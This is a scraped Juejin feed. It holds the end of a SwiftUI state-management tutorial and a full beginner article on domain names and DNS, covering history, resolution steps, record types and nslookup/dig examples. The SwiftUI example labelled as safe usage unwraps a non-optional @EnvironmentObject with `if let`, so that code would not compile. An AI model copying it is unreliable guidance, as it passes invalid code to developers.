    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Change Name"</span>) {
            viewModel.name <span class="hljs-operator">=</span> <span class="hljs-string">"Alice"</span>  <span class="hljs-comment">// ✅ 会触发更新</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-30">陷阱3：@EnvironmentObject 未提供</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@EnvironmentObject</span> <span class="hljs-keyword">var</span> settings: <span class="hljs-type">AppSettings</span>  <span class="hljs-comment">// 运行时崩溃如果未提供！</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(settings.theme)
    }
}

<span class="hljs-comment">// ✅ 安全使用</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@EnvironmentObject</span> <span class="hljs-keyword">var</span> settings: <span class="hljs-type">AppSettings</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> settings <span class="hljs-operator">=</span> settings {  <span class="hljs-comment">// 实际上 @EnvironmentObject 是 non-optional</span>
            <span class="hljs-type">Text</span>(settings.theme)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Settings not available"</span>)
        }
    }
}
</code></pre>
<h3 data-id="heading-31">11. <strong>状态管理与 Combine 集成</strong></h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> Combine

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataService</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> data: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cancellables <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">AnyCancellable</span>&gt;()
    
    <span class="hljs-keyword">init</span>() {
        <span class="hljs-comment">// 使用 Combine 处理复杂数据流</span>
        <span class="hljs-variable">$data</span>
            .debounce(for: .milliseconds(<span class="hljs-number">300</span>), scheduler: <span class="hljs-type">RunLoop</span>.main)
            .sink { newData <span class="hljs-keyword">in</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"Data updated: <span class="hljs-subst">\(newData)</span>"</span>)
            }
            .store(in: <span class="hljs-operator">&amp;</span>cancellables)
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchData</span>() {
        <span class="hljs-comment">// 模拟网络请求</span>
        <span class="hljs-type">URLSession</span>.shared.dataTaskPublisher(for: <span class="hljs-type">URL</span>(string: <span class="hljs-string">"https://api.example.com"</span>)<span class="hljs-operator">!</span>)
            .map(\.data)
            .decode(type: [<span class="hljs-type">String</span>].<span class="hljs-keyword">self</span>, decoder: <span class="hljs-type">JSONDecoder</span>())
            .receive(on: <span class="hljs-type">DispatchQueue</span>.main)
            .sink(receiveCompletion: { <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> },
                  receiveValue: { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] newData <span class="hljs-keyword">in</span>
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.data <span class="hljs-operator">=</span> newData
            })
            .store(in: <span class="hljs-operator">&amp;</span>cancellables)
    }
}
</code></pre>
<h3 data-id="heading-32">12. <strong>总结：状态管理选择指南</strong></h3>


















































<table><thead><tr><th>场景</th><th>推荐方案</th><th>说明</th></tr></thead><tbody><tr><td><strong>简单视图内部状态</strong></td><td><code>@State</code></td><td>计数器、开关状态等</td></tr><tr><td><strong>父子视图双向绑定</strong></td><td><code>@Binding</code></td><td>表单输入、设置传递</td></tr><tr><td><strong>视图自己的 ViewModel</strong></td><td><code>@StateObject</code></td><td>创建并拥有 ViewModel</td></tr><tr><td><strong>接收外部 ViewModel</strong></td><td><code>@ObservedObject</code></td><td>父视图传递的 ViewModel</td></tr><tr><td><strong>跨多级视图共享</strong></td><td><code>@EnvironmentObject</code></td><td>主题、用户设置等</td></tr><tr><td><strong>访问系统设置</strong></td><td><code>@Environment</code></td><td>深色模式、区域设置</td></tr><tr><td><strong>用户默认设置</strong></td><td><code>@AppStorage</code></td><td>持久化简单设置</td></tr><tr><td><strong>场景状态恢复</strong></td><td><code>@SceneStorage</code></td><td>多窗口应用状态恢复</td></tr></tbody></table>
<p>记住关键原则：<strong>状态应该存储在能覆盖所有需要访问该状态的视图的最高层级中，但不要更高</strong>。</p>
<p>这种设计使得 SwiftUI 应用既灵活又高效，能够自动优化视图更新，提供流畅的用户体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么网站需要"域名"？——从 IP 地址到网址的演进]]></title>    <link>https://juejin.cn/post/7583992239103672372</link>    <guid>https://juejin.cn/post/7583992239103672372</guid>    <pubDate>2025-12-16T06:58:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103672372" data-draft-id="7583973472324124687" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么网站需要&quot;域名&quot;？——从 IP 地址到网址的演进"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T06:58:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无限大6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么网站需要"域名"？——从 IP 地址到网址的演进
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无限大6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:58:54.000Z" title="Tue Dec 16 2025 06:58:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🌐 为什么网站需要"域名"？——从 IP 地址到网址的演进 📍</h2>
<blockquote>
<p>大家好，我是无限大，欢迎收看十万个为什么系列文章</p>
<p>希望今天的内容能对大家有所帮助</p>
</blockquote>
<p>想象一下，你去一个陌生城市找朋友：</p>
<ul>
<li>朋友告诉你："我住在XX市XX区XX路XX号XX小区XX栋XX单元XX室"</li>
<li>或者朋友告诉你："我住在'幸福家园小区3栋2单元501室'"</li>
</ul>
<p>哪个更容易记住？显然是后者！电脑访问网站也面临同样的问题——IP地址就像一长串门牌号，而域名就像一个好记的小区名。今天咱们就来揭开域名的神秘面纱！</p>
<h3 data-id="heading-1">📜 域名的"前世今生"：从纯IP到网址</h3>
<h4 data-id="heading-2">1. 🌐 ARPANET时代：纯IP的"黑暗时代"</h4>
<p>1969年，互联网的前身ARPANET诞生了。那时候，电脑之间通信只能用IP地址——一串枯燥的数字。</p>
<p>想象一下，那时候访问网站的场景：</p>
<blockquote>
<p>"嘿，我建了个网站，IP是10.0.0.1，你记一下，明天访问看看！"
"好的，10.0.0.1...等等，是10.0.0.1还是10.0.1.0？"</p>
</blockquote>
<p>这就像你给朋友打电话，却要记住11位电话号码，还不能写错一个数字！😱</p>
<h4 data-id="heading-3">2. 🧩 DNS系统诞生：域名的"曙光"</h4>
<p>1983年，保罗·莫卡派乔斯（Paul Mockapetris）发明了DNS（域名系统），这是互联网发展史上的里程碑！</p>
<p>DNS系统的作用就像一本"互联网电话簿"：</p>
<ul>
<li>你输入域名（google.com）</li>
<li>DNS帮你查找对应的IP地址（142.250.74.142）</li>
<li>浏览器用IP地址访问网站</li>
</ul>
<p>这就像你给朋友打电话，只需要按名字拨号，不用记电话号码！📞</p>
<h4 data-id="heading-4">3. 💰 域名商业化：从免费到亿万市场</h4>
<p>1985年，世界上第一个.com域名"symbolics.com"注册成功。1993年，NSI公司获得了.com、.net、.org域名的独家注册权，开始商业化运营。</p>
<p>1998年，ICANN（互联网名称与数字地址分配机构）成立，域名市场开始百花齐放。如今，全球有<strong>3.5亿+注册域名</strong>，每天DNS查询量超<strong>1万亿次</strong>！</p>
<h3 data-id="heading-5">🔧 DNS工作原理：从域名到IP的"翻译官"</h3>
<p>DNS系统就像一个"分布式翻译网络"，由无数台域名服务器组成。当你访问google.com时，发生了什么？</p>
<h4 data-id="heading-6">1. 🔍 DNS分层解析流程</h4>
<p>DNS解析是一个"从上到下"的查询过程：</p>
<ol>
<li><strong>根域名服务器</strong>："我不知道google.com的IP，但我知道.com顶级域名服务器的地址！"🌍</li>
<li><strong>顶级域名服务器</strong>："我不知道google.com的IP，但我知道google.com权威域名服务器的地址！"🏢</li>
<li><strong>权威域名服务器</strong>："google.com的IP是142.250.74.142，给你！"✅</li>
</ol>
<p>这就像你找朋友：</p>
<ul>
<li>你问国家邮政总局："幸福家园小区在哪？"</li>
<li>邮政总局："在XX市，你问XX市邮政局！"</li>
<li>市邮政局："在XX区，你问XX区邮政所！"</li>
<li>区邮政所："具体地址是XX路XX号，给你！"</li>
</ul>
<h4 data-id="heading-7">2. 📋 DNS记录类型</h4>
<p>DNS服务器存储了多种类型的记录，常见的有：</p>



































<table><thead><tr><th>记录类型</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td>A</td><td>将域名解析为IPv4地址</td><td>google.com → 142.250.74.142</td></tr><tr><td>AAAA</td><td>将域名解析为IPv6地址</td><td>google.com → 2607:f8b0:4005:804::200e</td></tr><tr><td>CNAME</td><td>域名别名</td><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.google.com" target="_blank" title="http://www.google.com" ref="nofollow noopener noreferrer">www.google.com</a> → google.com</td></tr><tr><td>MX</td><td>邮件服务器</td><td>gmail.com → mx.google.com</td></tr><tr><td>NS</td><td>域名服务器</td><td>google.com → ns1.google.com</td></tr></tbody></table>
<h4 data-id="heading-8">3. 💾 缓存机制：加速DNS查询</h4>
<p>为了提高查询速度，DNS系统有强大的缓存机制：</p>
<ul>
<li>你的电脑会缓存最近查询过的域名</li>
<li>你的ISP（网络服务商）也有DNS缓存</li>
<li>各级域名服务器也会缓存结果</li>
</ul>
<p>这就像你记住了朋友的电话号码，下次打电话就不用查通讯录了！💡</p>
<h3 data-id="heading-9">📊 趣味对比：记IP vs 记域名</h3>
<p>咱们来做个小测验，看看你能记住多少：</p>








































<table><thead><tr><th>类型</th><th>内容</th><th>你能记住吗？</th></tr></thead><tbody><tr><td>IP地址</td><td>142.250.74.142</td><td>😵‍💫 很难</td></tr><tr><td>域名</td><td>google.com</td><td>😎 轻松</td></tr><tr><td>IP地址</td><td>202.108.22.5</td><td>😵‍💫 很难</td></tr><tr><td>域名</td><td>baidu.com</td><td>😎 轻松</td></tr><tr><td>IP地址</td><td>31.13.81.36</td><td>😵‍💫 很难</td></tr><tr><td>域名</td><td>facebook.com</td><td>😎 轻松</td></tr></tbody></table>
<p>结果很明显：<strong>记域名比记IP地址容易1000倍！</strong></p>
<h3 data-id="heading-10">💻 代码实例：手动查询DNS记录</h3>
<p>咱们来用命令行工具<code>nslookup</code>和<code>dig</code>手动查询DNS记录，看看DNS是如何工作的！</p>
<h4 data-id="heading-11">1. 使用nslookup查询</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查询google.com的A记录</span>
nslookup google.com

<span class="hljs-comment"># 输出示例：</span>
Server:  dns.google
Address:  8.8.8.8

Non-authoritative answer:
Name:    google.com
Address:  142.250.74.142

<span class="hljs-comment"># 查询google.com的AAAA记录（IPv6）</span>
nslookup -<span class="hljs-built_in">type</span>=AAAA google.com

<span class="hljs-comment"># 查询google.com的MX记录（邮件服务器）</span>
nslookup -<span class="hljs-built_in">type</span>=MX google.com
</code></pre>
<h4 data-id="heading-12">2. 使用dig查询（更详细）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 详细查询google.com的DNS记录</span>
dig google.com +trace

<span class="hljs-comment"># 输出示例（简化）：</span>
; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; google.com +trace
;; global options: +cmd
.                       518400  IN      NS      a.root-servers.net.
.                       518400  IN      NS      b.root-servers.net.
<span class="hljs-comment"># ... 根服务器信息 ...</span>
com.                    172800  IN      NS      a.gtld-servers.net.
<span class="hljs-comment"># ... 顶级域名服务器信息 ...</span>
google.com.             172800  IN      NS      ns1.google.com.
google.com.             300     IN      A       142.250.74.142
</code></pre>
<h3 data-id="heading-13">🎯 域名的"七十二变"：不同类型的域名</h3>
<p>域名就像"互联网上的身份证"，有不同的类型：</p>
<h4 data-id="heading-14">1. 🔝 顶级域名（TLD）</h4>
<ul>
<li><strong>通用顶级域名</strong>：.com（商业）、.net（网络）、.org（组织）</li>
<li><strong>国家顶级域名</strong>：.cn（中国）、.us（美国）、.uk（英国）</li>
<li><strong>新顶级域名</strong>：.xyz、.tech、.blog、.shop</li>
</ul>
<h4 data-id="heading-15">2. 🏢 二级域名</h4>
<p>在顶级域名前加上前缀，比如：</p>
<ul>
<li>baidu.com（baidu是二级域名，.com是顶级域名）</li>
<li>github.com（github是二级域名，.com是顶级域名）</li>
</ul>
<h4 data-id="heading-16">3. 🌐 三级域名</h4>
<p>在二级域名前加上前缀，比如：</p>
<ul>
<li><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.baidu.com%25EF%25BC%2588www%25E6%2598%25AF%25E4%25B8%2589%25E7%25BA%25A7%25E5%259F%259F%25E5%2590%258D%25EF%25BC%2589" target="_blank" title="http://www.baidu.com%EF%BC%88www%E6%98%AF%E4%B8%89%E7%BA%A7%E5%9F%9F%E5%90%8D%EF%BC%89" ref="nofollow noopener noreferrer">www.baidu.com（www是三级域名）</a></li>
<li>mail.google.com（mail是三级域名）</li>
</ul>
<h4 data-id="heading-17">4. 🔢 IPv6域名</h4>
<p>为了适应IPv6地址，还有特殊的域名格式，比如：</p>
<ul>
<li>[2001:db8::1]（直接在URL中使用IPv6地址）</li>
</ul>
<h3 data-id="heading-18">🎨 域名的"艺术"：好域名的标准</h3>
<p>一个好的域名就像一个好的品牌名，容易记、有意义。判断一个域名好不好，看这几点：</p>






























<table><thead><tr><th>标准</th><th>好域名示例</th><th>差域名示例</th></tr></thead><tbody><tr><td>简短易记</td><td>google.com</td><td>thisisareallylongdomainname.com</td></tr><tr><td>有意义</td><td>taobao.com（淘宝）</td><td>xyz123.com</td></tr><tr><td>无特殊字符</td><td>baidu.com</td><td>my-site.com（含连字符）</td></tr><tr><td>后缀合适</td><td>techcrunch.com（.com适合科技媒体）</td><td>techcrunch.org（.org适合非营利组织）</td></tr></tbody></table>
<h3 data-id="heading-19">⚠️ 域名的"陷阱"：常见问题</h3>
<h4 data-id="heading-20">1. 🔒 域名劫持</h4>
<p>域名劫持是指攻击者通过各种手段获取域名的控制权，然后将域名指向恶意网站。</p>
<p><strong>预防方法</strong>：</p>
<ul>
<li>使用强密码保护域名账号</li>
<li>开启双因素认证</li>
<li>定期检查域名解析记录</li>
</ul>
<h4 data-id="heading-21">2. ⏳ 域名过期</h4>
<p>很多人因为忘记续费，导致域名过期被抢注。</p>
<p><strong>预防方法</strong>：</p>
<ul>
<li>设置自动续费</li>
<li>提前30天续费</li>
<li>开启到期提醒</li>
</ul>
<h4 data-id="heading-22">3. 🏷️ 域名争议</h4>
<p>如果你的域名和别人的品牌名相似，可能会引发争议。</p>
<p><strong>预防方法</strong>：</p>
<ul>
<li>不要注册知名品牌的相似域名</li>
<li>注册相关后缀的域名（.com、.cn、.net等）</li>
</ul>
<h3 data-id="heading-23">🔮 域名的"未来"：从IPv6到区块链</h3>
<h4 data-id="heading-24">1. 🚀 IPv6时代的域名</h4>
<p>随着IPv6的普及，域名系统也在升级。IPv6地址更长（128位），但DNS系统可以轻松处理。</p>
<h4 data-id="heading-25">2. ⛓️ 区块链域名</h4>
<p>区块链域名是基于区块链技术的去中心化域名，比如：</p>
<ul>
<li>.eth（以太坊域名）</li>
<li>.crypto（区块链域名）</li>
</ul>
<p>区块链域名的优势是：</p>
<ul>
<li>去中心化，无需注册商</li>
<li>支持加密货币支付</li>
<li>永久拥有，不会过期</li>
</ul>
<h4 data-id="heading-26">3. 🤖 AI与域名</h4>
<p>未来，AI可能会改变域名的使用方式：</p>
<ul>
<li>语音域名：直接通过语音访问网站</li>
<li>智能解析：根据用户位置自动选择最快的服务器</li>
<li>个性化域名：根据用户兴趣推荐相关网站</li>
</ul>
<h3 data-id="heading-27">🎓 互动小测验：你答对了吗？</h3>
<p>来测试一下你对域名的了解：</p>



































<table><thead><tr><th>问题</th><th>答案</th><th>你答对了吗？</th></tr></thead><tbody><tr><td>世界上第一个.com域名是什么？</td><td>symbolics.com</td><td>✅/❌</td></tr><tr><td>DNS的中文全称是什么？</td><td>域名系统</td><td>✅/❌</td></tr><tr><td>全球注册域名数量约为多少？</td><td>3.5亿+</td><td>✅/❌</td></tr><tr><td>每天DNS查询量约为多少？</td><td>1万亿次+</td><td>✅/❌</td></tr><tr><td>.com域名是哪一年开始商业化的？</td><td>1993年</td><td>✅/❌</td></tr></tbody></table>
<h3 data-id="heading-28">🎯 结语：域名的"智慧"</h3>
<p>域名的发明，是互联网从"技术驱动"到"用户友好"的重要转变。它让互联网从少数技术专家的工具，变成了普通人都能使用的平台。</p>
<p>下次当你在浏览器中输入域名访问网站时，不妨想一想：在这背后，有一个庞大的DNS系统正在为你服务，把复杂的IP地址变成了简单易记的域名。</p>
<p>域名就像互联网的"门面"，它不仅是一串字符，更是品牌的象征、用户的入口。一个好的域名，能让你的网站在浩瀚的互联网中脱颖而出！</p>
<hr/>
<h3 data-id="heading-29">💬 互动话题</h3>
<ol>
<li>你知道哪些有趣的域名？</li>
<li>你有自己的域名吗？为什么注册它？</li>
<li>你觉得未来域名会被什么取代吗？</li>
</ol>
<p>快来评论区聊聊你的想法！💬 点赞收藏不迷路，咱们下期继续探索计算机的"十万个为什么"！🎉</p>
<p><strong>关注我</strong>，下期带你解锁更多计算机的"奇葩冷知识"！🤓</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[8 个支持一键导入 TRAE 使用的自定义智能体]]></title>    <link>https://juejin.cn/post/7583983152324378650</link>    <guid>https://juejin.cn/post/7583983152324378650</guid>    <pubDate>2025-12-16T05:33:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583983152324378650" data-draft-id="7583969283790274614" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="8 个支持一键导入 TRAE 使用的自定义智能体"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-12-16T05:33:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            8 个支持一键导入 TRAE 使用的自定义智能体
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T05:33:09.000Z" title="Tue Dec 16 2025 05:33:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
